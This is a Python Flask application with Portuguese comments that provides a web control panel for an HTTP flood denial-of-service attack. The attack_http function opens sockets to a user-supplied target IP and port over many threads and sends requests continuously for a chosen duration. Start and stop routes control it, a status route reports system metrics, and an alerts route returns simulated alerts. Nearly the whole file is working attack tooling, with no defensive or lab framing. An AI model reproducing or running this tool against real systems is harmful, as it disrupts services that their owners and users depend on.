from flask import Flask, request, jsonify, render_template
import threading
import socket
import random
import time
import subprocess
import requests
import psutil  # Para monitoramento de CPU, RAM, etc.
import pyshark
from scapy.all import IP, TCP, UDP, send, RandShort

app = Flask(__name__)

# Variáveis globais para controlar a execução
attack_running = False
attack_type = ""
target_ip = ""
port = 0
start_time = 0
end_time = 0

# Função para monitorar o sistema (CPU, RAM, etc.)
def get_system_status():
    # Pegando uso de CPU, RAM e Disco
    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    # Pegando informações de rede
    net_io = psutil.net_io_counters()
    network_traffic = net_io.bytes_sent + net_io.bytes_recv  # Total de tráfego em bytes
    return cpu_usage, ram_usage, disk_usage, network_traffic

# Função para iniciar ataque HTTP (Flood)
def attack_http(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, port))
            headers = [
                "GET / HTTP/1.1",
                f"Host: {target_ip}",
                "User-Agent: Mozilla/5.0",
                "Connection: keep-alive"
            ]
            request_header = "\r\n".join(headers) + "\r\n\r\n"
            sock.send(request_header.encode())
            sock.close()
        except Exception as e:
            print(f"[HTTP] Failed to connect: {e}")

# Função para iniciar o ataque
def start_attack_thread(target_ip, port, duration, threads, attack_type):
    global attack_running
    attack_running = True
    if attack_type == "http_flood":
        for _ in range(threads):
            threading.Thread(target=attack_http, args=(target_ip, port, duration)).start()

# Rota para a página inicial
@app.route('/')
def home():
    return render_template('index.html')

# Rota para iniciar o ataque
@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    global target_ip, port, attack_type, start_time, end_time
    target_ip = data.get('target_ip')
    port = int(data.get('port'))
    threads = int(data.get('threads'))
    duration = int(data.get('duration'))
    attack_type = data.get('attack_type')

    start_time = time.time()
    end_time = start_time + duration

    threading.Thread(target=start_attack_thread, args=(target_ip, port, duration, threads, attack_type)).start()

    return jsonify({"message": f"Ataque '{attack_type}' iniciado com sucesso!"})

# Rota para parar o ataque
@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    global attack_running
    attack_running = False
    return jsonify({"message": "Ataque interrompido!"})

# Rota para pegar o status do sistema e métricas
@app.route('/get_system_status', methods=['GET'])
def get_metrics():
    cpu_usage, ram_usage, disk_usage, network_traffic = get_system_status()
    uptime = time.time() - start_time if attack_running else 0
    return jsonify({
        "cpu_usage": cpu_usage,
        "ram_usage": ram_usage,
        "disk_usage": disk_usage,
        "network_traffic": network_traffic,
        "uptime": uptime,
        "attack_running": attack_running,
        "attack_type": attack_type,
        "target_ip": target_ip,
        "port": port
    })

# Rota para pegar os alertas de ataques
@app.route('/get_alerts', methods=['GET'])
def get_alerts():
    # Simulação de alertas
    alerts = [
        "Tentativa de DDoS detectada",
        "Requisição suspeita de IP 192.168.1.1",
        "Bloqueio de IP 10.0.0.5 realizado"
    ]
    return jsonify({"alerts": alerts})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
